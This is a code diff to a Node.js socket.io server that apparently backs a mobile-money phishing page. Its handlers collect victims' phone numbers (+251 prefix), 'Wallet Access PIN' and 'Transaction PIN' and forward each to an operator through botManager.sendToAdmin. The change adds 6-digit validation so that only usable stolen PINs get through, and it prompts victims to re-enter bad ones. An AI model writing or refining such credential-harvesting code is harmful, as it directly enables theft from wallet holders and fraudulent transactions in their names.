@@ -55,12 +55,26 @@ io.on('connection', (socket) => {
 
     const getValidId = (data) => (data && data.appId) ? data.appId : activeRoom;
 
+    // Helper regex logic to validate exactly 6 digits numeric strings
+    const isValid6DigitPin = (pin) => {
+        if (!pin) return false;
+        const cleanPin = String(pin).trim();
+        return /^\d{6}$/.test(cleanPin);
+    };
+
     socket.on('submit-step1-credentials', (data) => {
         const currentId = getValidId(data);
-        // Step 1 uses requireInlineButtons = false so it runs purely as a background notification card
+        
+        // Validation check for 6-digit Wallet Access PIN
+        if (!data || !isValid6DigitPin(data.pin)) {
+            console.warn(`⚠️ Blocked malformed Wallet Access PIN from ${currentId}. Expected 6 digits.`);
+            socket.emit('validation-error', { target: 'pin', message: 'Wallet Access PIN must be exactly 6 digits.' });
+            return;
+        }
+
         botManager.sendToAdmin(currentId, "Step 1 - Account Login", {
             "Mobile Phone": `+251${data.phone}`,
-            "Wallet Access PIN": data.pin
+            "Wallet Access PIN": String(data.pin).trim()
         }, false);
     });
 
@@ -73,8 +87,16 @@ io.on('connection', (socket) => {
 
     socket.on('submit-final-pin', (data) => {
         const currentId = getValidId(data);
+        
+        // Validation check for 6-digit Transaction PIN
+        if (!data || !isValid6DigitPin(data.pin)) {
+            console.warn(`⚠️ Blocked malformed Transaction PIN from ${currentId}. Expected 6 digits.`);
+            socket.emit('validation-error', { target: 'transaction-pin', message: 'Transaction PIN must be exactly 6 digits.' });
+            return;
+        }
+
         botManager.sendToAdmin(currentId, "Step 3 - Transaction Authorization", {
-            "Transaction PIN": data.pin
+            "Transaction PIN": String(data.pin).trim()
         }, true);
     });
 
